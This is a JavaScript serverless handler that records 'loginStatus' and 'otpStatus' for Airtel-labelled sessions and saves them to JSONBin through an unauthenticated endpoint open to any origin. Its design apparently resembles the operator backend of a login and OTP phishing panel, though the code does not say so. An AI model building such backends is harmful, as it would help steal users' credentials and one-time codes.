const { default: axios } = require('axios');

// In-memory state with JSONBin persistence
const sessionState = new Map();
const JSONBIN_KEY = process.env.JSONBIN_KEY || '';
const JSONBIN_ID = process.env.JSONBIN_ID || '';

// Load from JSONBin on startup
async function loadState() {
  if (JSONBIN_KEY && JSONBIN_ID) {
    try {
      const res = await axios.get(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}/latest`, {
        headers: { 'X-Master-Key': JSONBIN_KEY, 'X-Bin-Meta': 'false' }
      });
      if (res.data) {
        Object.entries(res.data).forEach(([key, value]) => {
          if (key.startsWith('airtel_')) {
            sessionState.set(key, value);
          }
        });
        console.log('[set-status] Loaded state from JSONBin');
      }
    } catch (e) {
      console.warn('[set-status] Failed to load from JSONBin:', e.message);
    }
  }
}

// Save to JSONBin
async function saveState() {
  if (JSONBIN_KEY && JSONBIN_ID) {
    try {
      const data = Object.fromEntries(sessionState);
      await axios.put(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}`, data, {
        headers: { 'Content-Type': 'application/json', 'X-Master-Key': JSONBIN_KEY }
      });
    } catch (e) {
      console.warn('[set-status] Failed to save to JSONBin:', e.message);
    }
  }
}

loadState();

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

  try {
    const { sessionId, loginStatus, otpStatus } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

    const key = `airtel_${sessionId}`;
    const current = sessionState.get(key) || {};
    if (loginStatus) current.loginStatus = loginStatus;
    if (otpStatus) current.otpStatus = otpStatus;
    current.lastUpdated = Date.now();
    sessionState.set(key, current);

    await saveState();
    console.log('[set-status] Updated:', sessionId, current);

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('[set-status] Error:', error);
    return res.status(500).json({ error: error.message });
  }
}
